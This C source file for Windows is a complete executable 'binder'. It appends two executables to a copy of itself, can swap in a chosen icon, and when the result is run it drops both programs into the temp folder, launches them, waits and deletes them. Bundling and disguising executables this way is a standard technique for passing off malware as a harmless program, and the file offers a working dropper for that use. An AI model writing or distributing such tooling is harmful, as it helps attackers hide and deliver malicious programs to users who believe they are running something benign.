#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define MAX_PATH_LENGTH 260

// Structure for ICON resource data
#pragma pack(push, 2)
typedef struct {
    WORD reserved;       // Reserved (must be 0)
    WORD type;           // Resource type (1 for icon)
    WORD count;          // Number of icons
} ICONDIR;

typedef struct {
    BYTE width;          // Icon width
    BYTE height;         // Icon height
    BYTE color_count;    // Number of colors (0 if >= 8bpp)
    BYTE reserved;       // Reserved (must be 0)
    WORD planes;         // Color planes
    WORD bit_count;      // Bits per pixel
    DWORD bytes_in_res;  // Size of the icon data
    DWORD image_offset;  // Offset to the icon image data
} ICONDIRENTRY;

typedef struct {
    WORD id_reserved;    // Reserved (must be 0)
    WORD id_type;        // Resource type (1 for icon)
    WORD id_count;       // Number of icons
    // Followed by id_entries[id_count]
} GRPICONDIR;

typedef struct {
    BYTE width;          // Icon width
    BYTE height;         // Icon height
    BYTE color_count;    // Number of colors (0 if >= 8bpp)
    BYTE reserved;       // Reserved (must be 0)
    WORD planes;         // Color planes
    WORD bit_count;      // Bits per pixel
    DWORD bytes_in_res;  // Size of the icon data
    WORD id;             // Resource ID
} GRPICONDIRENTRY;
#pragma pack(pop)

int main(int argc, char *argv[]) {
    char self_path[MAX_PATH_LENGTH];
    GetModuleFileName(NULL, self_path, MAX_PATH_LENGTH);
    
    FILE *self_file = fopen(self_path, "rb");
    if (!self_file) {
        return 1;
    }
    
    if (argc == 1) {
        fseek(self_file, 0, SEEK_END);
        long self_size = ftell(self_file);
        fseek(self_file, 0, SEEK_SET);
        
        char *self_data = (char *)malloc(self_size);
        if (!self_data) {
            fclose(self_file);
            return 1;
        }
        size_t self_read = fread(self_data, 1, self_size, self_file);
        if (self_read != self_size) {
            free(self_data);
            fclose(self_file);
            return 1;
        }
        fclose(self_file);
        
        long exe1_size, exe2_size;
        memcpy(&exe1_size, self_data + self_size - sizeof(long) * 2, sizeof(long));
        memcpy(&exe2_size, self_data + self_size - sizeof(long), sizeof(long));
        
        long exe1_offset = self_size - sizeof(long) * 2 - MAX_PATH_LENGTH * 2 - exe1_size - exe2_size;
        long exe2_offset = self_size - sizeof(long) * 2 - MAX_PATH_LENGTH * 2 - exe2_size;
        
        if (exe1_offset < 0 || exe2_offset < 0) {
            free(self_data);
            return 1;
        }
        
        char temp_dir[MAX_PATH_LENGTH];
        GetTempPath(MAX_PATH_LENGTH, temp_dir);
        
        char exe1_path[MAX_PATH_LENGTH];
        char exe2_path[MAX_PATH_LENGTH];
        
        char extracted1_name[MAX_PATH_LENGTH];
        char extracted2_name[MAX_PATH_LENGTH];
        
        long names_offset = self_size - sizeof(long) * 2 - MAX_PATH_LENGTH * 2;
        memcpy(extracted1_name, self_data + names_offset, MAX_PATH_LENGTH);
        memcpy(extracted2_name, self_data + names_offset + MAX_PATH_LENGTH, MAX_PATH_LENGTH);
        
        snprintf(exe1_path, MAX_PATH_LENGTH, "%s\\%s", temp_dir, extracted1_name);
        snprintf(exe2_path, MAX_PATH_LENGTH, "%s\\%s", temp_dir, extracted2_name);
        
        FILE *exe1_file = fopen(exe1_path, "wb");
        if (!exe1_file) {
            free(self_data);
            return 1;
        }
        size_t exe1_written = fwrite(self_data + exe1_offset, 1, exe1_size, exe1_file);
        if (exe1_written != exe1_size) {
            fclose(exe1_file);
            free(self_data);
            return 1;
        }
        fclose(exe1_file);
        
        FILE *exe2_file = fopen(exe2_path, "wb");
        if (!exe2_file) {
            free(self_data);
            return 1;
        }
        size_t exe2_written = fwrite(self_data + exe2_offset, 1, exe2_size, exe2_file);
        if (exe2_written != exe2_size) {
            fclose(exe2_file);
            free(self_data);
            return 1;
        }
        fclose(exe2_file);
        
        free(self_data);
        
        STARTUPINFO si1 = { sizeof(si1) };
        STARTUPINFO si2 = { sizeof(si2) };
        PROCESS_INFORMATION pi1, pi2;
        
        if (!CreateProcess(exe1_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si1, &pi1)) {
            return 1;
        }
        
        if (!CreateProcess(exe2_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si2, &pi2)) {
            CloseHandle(pi1.hProcess);
            CloseHandle(pi1.hThread);
            return 1;
        }
        
        WaitForSingleObject(pi1.hProcess, INFINITE);
        WaitForSingleObject(pi2.hProcess, INFINITE);
        
        CloseHandle(pi1.hProcess);
        CloseHandle(pi1.hThread);
        CloseHandle(pi2.hProcess);
        CloseHandle(pi2.hThread);
        
        DeleteFile(exe1_path);
        DeleteFile(exe2_path);
        
        return 0;
    }
    
    if (argc != 7) {
        fclose(self_file);
        return 1;
    }
    
    const char *exe1_path = argv[1];
    const char *exe2_path = argv[2];
    const char *output_path = argv[3];
    const char *extracted1_name = argv[4];
    const char *extracted2_name = argv[5];
    const char *icon_path = argv[6];
    
    FILE *log_file = fopen("binder_log.txt", "w");
    if (!log_file) {
        fclose(self_file);
        return 1;
    }
    
    FILE *exe1_file = fopen(exe1_path, "rb");
    if (!exe1_file) {
        fprintf(log_file, "Error: Could not open %s\n", exe1_path);
        fclose(log_file);
        fclose(self_file);
        return 1;
    }
    
    FILE *exe2_file = fopen(exe2_path, "rb");
    if (!exe2_file) {
        fprintf(log_file, "Error: Could not open %s\n", exe2_path);
        fclose(log_file);
        fclose(exe1_file);
        fclose(self_file);
        return 1;
    }
    
    fseek(self_file, 0, SEEK_END);
    long self_size = ftell(self_file);
    fseek(self_file, 0, SEEK_SET);
    fprintf(log_file, "Self size: %ld bytes\n", self_size);
    
    fseek(exe1_file, 0, SEEK_END);
    long exe1_size = ftell(exe1_file);
    fseek(exe1_file, 0, SEEK_SET);
    fprintf(log_file, "EXE1 size: %ld bytes\n", exe1_size);
    
    fseek(exe2_file, 0, SEEK_END);
    long exe2_size = ftell(exe2_file);
    fseek(exe2_file, 0, SEEK_SET);
    fprintf(log_file, "EXE2 size: %ld bytes\n", exe2_size);
    
    char *self_data = (char *)malloc(self_size);
    if (!self_data) {
        fprintf(log_file, "Error: Memory allocation failed for self data\n");
        fclose(log_file);
        fclose(self_file);
        fclose(exe1_file);
        fclose(exe2_file);
        return 1;
    }
    size_t self_read = fread(self_data, 1, self_size, self_file);
    if (self_read != self_size) {
        fprintf(log_file, "Error: Failed to read self data, read %zu of %ld bytes\n", self_read, self_size);
        free(self_data);
        fclose(log_file);
        fclose(self_file);
        fclose(exe1_file);
        fclose(exe2_file);
        return 1;
    }
    fclose(self_file);
    fprintf(log_file, "Self data read: %zu bytes\n", self_read);
    
    char *exe1_data = (char *)malloc(exe1_size);
    if (!exe1_data) {
        fprintf(log_file, "Error: Memory allocation failed for EXE1 data\n");
        free(self_data);
        fclose(log_file);
        fclose(exe1_file);
        fclose(exe2_file);
        return 1;
    }
    size_t exe1_read = fread(exe1_data, 1, exe1_size, exe1_file);
    if (exe1_read != exe1_size) {
        fprintf(log_file, "Error: Failed to read EXE1 data, read %zu of %ld bytes\n", exe1_read, exe1_size);
        free(self_data);
        free(exe1_data);
        fclose(log_file);
        fclose(exe1_file);
        fclose(exe2_file);
        return 1;
    }
    fclose(exe1_file);
    fprintf(log_file, "EXE1 data read: %zu bytes\n", exe1_read);
    
    char *exe2_data = (char *)malloc(exe2_size);
    if (!exe2_data) {
        fprintf(log_file, "Error: Memory allocation failed for EXE2 data\n");
        free(self_data);
        free(exe1_data);
        fclose(log_file);
        fclose(exe2_file);
        return 1;
    }
    size_t exe2_read = fread(exe2_data, 1, exe2_size, exe2_file);
    if (exe2_read != exe2_size) {
        fprintf(log_file, "Error: Failed to read EXE2 data, read %zu of %ld bytes\n", exe2_read, exe2_size);
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        fclose(log_file);
        fclose(exe2_file);
        return 1;
    }
    fclose(exe2_file);
    fprintf(log_file, "EXE2 data read: %zu bytes\n", exe2_read);
    
    char *icon_data = NULL;
    long icon_size = 0;
    if (strcmp(icon_path, "") != 0) {
        FILE *icon_file = fopen(icon_path, "rb");
        if (!icon_file) {
            fprintf(log_file, "Error: Could not open icon file %s\n", icon_path);
            free(self_data);
            free(exe1_data);
            free(exe2_data);
            fclose(log_file);
            return 1;
        }
        
        fseek(icon_file, 0, SEEK_END);
        icon_size = ftell(icon_file);
        fseek(icon_file, 0, SEEK_SET);
        fprintf(log_file, "Icon size: %ld bytes\n", icon_size);
        
        icon_data = (char *)malloc(icon_size);
        if (!icon_data) {
            fprintf(log_file, "Error: Memory allocation failed for icon data\n");
            free(self_data);
            free(exe1_data);
            free(exe2_data);
            fclose(log_file);
            fclose(icon_file);
            return 1;
        }
        size_t icon_read = fread(icon_data, 1, icon_size, icon_file);
        if (icon_read != icon_size) {
            fprintf(log_file, "Error: Failed to read icon data, read %zu of %ld bytes\n", icon_read, icon_size);
            free(self_data);
            free(exe1_data);
            free(exe2_data);
            free(icon_data);
            fclose(log_file);
            fclose(icon_file);
            return 1;
        }
        fclose(icon_file);
        fprintf(log_file, "Icon data read: %zu bytes\n", icon_read);
    }
    
    FILE *output_file = fopen(output_path, "wb");
    if (!output_file) {
        fprintf(log_file, "Error: Could not create output file %s\n", output_path);
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        if (icon_data) free(icon_data);
        fclose(log_file);
        return 1;
    }
    
    size_t self_written = fwrite(self_data, 1, self_size, output_file);
    if (self_written != self_size) {
        fprintf(log_file, "Error: Failed to write self data, wrote %zu of %ld bytes\n", self_written, self_size);
        fclose(output_file);
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        if (icon_data) free(icon_data);
        fclose(log_file);
        return 1;
    }
    fprintf(log_file, "Self data written: %zu bytes\n", self_written);
    
    fclose(output_file);
    
    if (icon_data) {
        HANDLE hUpdate = BeginUpdateResource(output_path, FALSE);
        if (!hUpdate) {
            fprintf(log_file, "Error: BeginUpdateResource failed: %lu\n", GetLastError());
            free(self_data);
            free(exe1_data);
            free(exe2_data);
            free(icon_data);
            fclose(log_file);
            return 1;
        }
        
        ICONDIR *icon_dir = (ICONDIR *)icon_data;
        if (icon_dir->type != 1 || icon_dir->count < 1) {
            fprintf(log_file, "Error: Invalid icon file format\n");
            EndUpdateResource(hUpdate, TRUE);
            free(self_data);
            free(exe1_data);
            free(exe2_data);
            free(icon_data);
            fclose(log_file);
            return 1;
        }
        
        ICONDIRENTRY *icon_entries = (ICONDIRENTRY *)(icon_data + sizeof(ICONDIR));
        
        for (WORD i = 0; i < icon_dir->count; i++) {
            if (!UpdateResource(hUpdate, RT_ICON, MAKEINTRESOURCE(i + 1), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), icon_data + icon_entries[i].image_offset, icon_entries[i].bytes_in_res)) {
                fprintf(log_file, "Error: UpdateResource for RT_ICON %d failed: %lu\n", i + 1, GetLastError());
                EndUpdateResource(hUpdate, TRUE);
                free(self_data);
                free(exe1_data);
                free(exe2_data);
                free(icon_data);
                fclose(log_file);
                return 1;
            }
            fprintf(log_file, "Added RT_ICON resource %d, size: %lu bytes\n", i + 1, icon_entries[i].bytes_in_res);
        }
        
        size_t grp_icon_size = sizeof(GRPICONDIR) + icon_dir->count * sizeof(GRPICONDIRENTRY);
        GRPICONDIR *grp_icon = (GRPICONDIR *)malloc(grp_icon_size);
        if (!grp_icon) {
            fprintf(log_file, "Error: Memory allocation failed for GRPICONDIR\n");
            EndUpdateResource(hUpdate, TRUE);
            free(self_data);
            free(exe1_data);
            free(exe2_data);
            free(icon_data);
            fclose(log_file);
            return 1;
        }
        
        grp_icon->id_reserved = 0;
        grp_icon->id_type = 1;
        grp_icon->id_count = icon_dir->count;
        GRPICONDIRENTRY *grp_entries = (GRPICONDIRENTRY *)(grp_icon + 1);
        for (WORD i = 0; i < icon_dir->count; i++) {
            grp_entries[i].width = icon_entries[i].width;
            grp_entries[i].height = icon_entries[i].height;
            grp_entries[i].color_count = icon_entries[i].color_count;
            grp_entries[i].reserved = icon_entries[i].reserved;
            grp_entries[i].planes = icon_entries[i].planes;
            grp_entries[i].bit_count = icon_entries[i].bit_count;
            grp_entries[i].bytes_in_res = icon_entries[i].bytes_in_res;
            grp_entries[i].id = i + 1;
        }
        
        if (!UpdateResource(hUpdate, RT_GROUP_ICON, "MAINICON", MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), grp_icon, grp_icon_size)) {
            fprintf(log_file, "Error: UpdateResource for RT_GROUP_ICON failed: %lu\n", GetLastError());
            EndUpdateResource(hUpdate, TRUE);
            free(grp_icon);
            free(self_data);
            free(exe1_data);
            free(exe2_data);
            free(icon_data);
            fclose(log_file);
            return 1;
        }
        fprintf(log_file, "Added RT_GROUP_ICON resource, size: %zu bytes\n", grp_icon_size);
        
        if (!EndUpdateResource(hUpdate, FALSE)) {
            fprintf(log_file, "Error: EndUpdateResource failed: %lu\n", GetLastError());
            free(grp_icon);
            free(self_data);
            free(exe1_data);
            free(exe2_data);
            free(icon_data);
            fclose(log_file);
            return 1;
        }
        free(grp_icon);
        free(icon_data);
        fprintf(log_file, "Icon embedded successfully\n");
    }
    
    output_file = fopen(output_path, "ab");
    if (!output_file) {
        fprintf(log_file, "Error: Could not open output file %s in append mode\n", output_path);
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        fclose(log_file);
        return 1;
    }
    
    size_t exe1_written = fwrite(exe1_data, 1, exe1_size, output_file);
    if (exe1_written != exe1_size) {
        fprintf(log_file, "Error: Failed to write EXE1 data, wrote %zu of %ld bytes\n", exe1_written, exe1_size);
        fclose(output_file);
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        fclose(log_file);
        return 1;
    }
    fprintf(log_file, "EXE1 data written: %zu bytes\n", exe1_written);
    
    size_t exe2_written = fwrite(exe2_data, 1, exe2_size, output_file);
    if (exe2_written != exe2_size) {
        fprintf(log_file, "Error: Failed to write EXE2 data, wrote %zu of %ld bytes\n", exe2_written, exe2_size);
        fclose(output_file);
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        fclose(log_file);
        return 1;
    }
    fprintf(log_file, "EXE2 data written: %zu bytes\n", exe2_written);
    
    char extracted1_name_buffer[MAX_PATH_LENGTH] = {0};
    char extracted2_name_buffer[MAX_PATH_LENGTH] = {0};
    strncpy(extracted1_name_buffer, extracted1_name, MAX_PATH_LENGTH - 1);
    strncpy(extracted2_name_buffer, extracted2_name, MAX_PATH_LENGTH - 1);
    size_t name1_written = fwrite(extracted1_name_buffer, 1, MAX_PATH_LENGTH, output_file);
    if (name1_written != MAX_PATH_LENGTH) {
        fprintf(log_file, "Error: Failed to write extracted1_name, wrote %zu of %d bytes\n", name1_written, MAX_PATH_LENGTH);
        fclose(output_file);
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        fclose(log_file);
        return 1;
    }
    fprintf(log_file, "Extracted1 name written: %zu bytes\n", name1_written);
    
    size_t name2_written = fwrite(extracted2_name_buffer, 1, MAX_PATH_LENGTH, output_file);
    if (name2_written != MAX_PATH_LENGTH) {
        fprintf(log_file, "Error: Failed to write extracted2_name, wrote %zu of %d bytes\n", name2_written, MAX_PATH_LENGTH);
        fclose(output_file);
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        fclose(log_file);
        return 1;
    }
    fprintf(log_file, "Extracted2 name written: %zu bytes\n", name2_written);
    
    size_t size1_written = fwrite(&exe1_size, sizeof(long), 1, output_file);
    if (size1_written != 1) {
        fprintf(log_file, "Error: Failed to write exe1_size\n");
        fclose(output_file);
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        fclose(log_file);
        return 1;
    }
    fprintf(log_file, "EXE1 size written: %zu longs\n", size1_written);
    
    size_t size2_written = fwrite(&exe2_size, sizeof(long), 1, output_file);
    if (size2_written != 1) {
        fprintf(log_file, "Error: Failed to write exe2_size\n");
        fclose(output_file);
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        fclose(log_file);
        return 1;
    }
    fprintf(log_file, "EXE2 size written: %zu longs\n", size2_written);
    
    long expected_size = self_size + exe1_size + exe2_size + MAX_PATH_LENGTH * 2 + sizeof(long) * 2;
    fprintf(log_file, "Expected total size: %ld bytes\n", expected_size);
    
    fclose(output_file);
    free(self_data);
    free(exe1_data);
    free(exe2_data);
    
    FILE *output_check = fopen(output_path, "rb");
    if (output_check) {
        fseek(output_check, 0, SEEK_END);
        long actual_size = ftell(output_check);
        fprintf(log_file, "Actual output file size: %ld bytes\n", actual_size);
        fclose(output_check);
    } else {
        fprintf(log_file, "Error: Could not verify output file size\n");
    }
    
    fclose(log_file);
    
    return 0;
}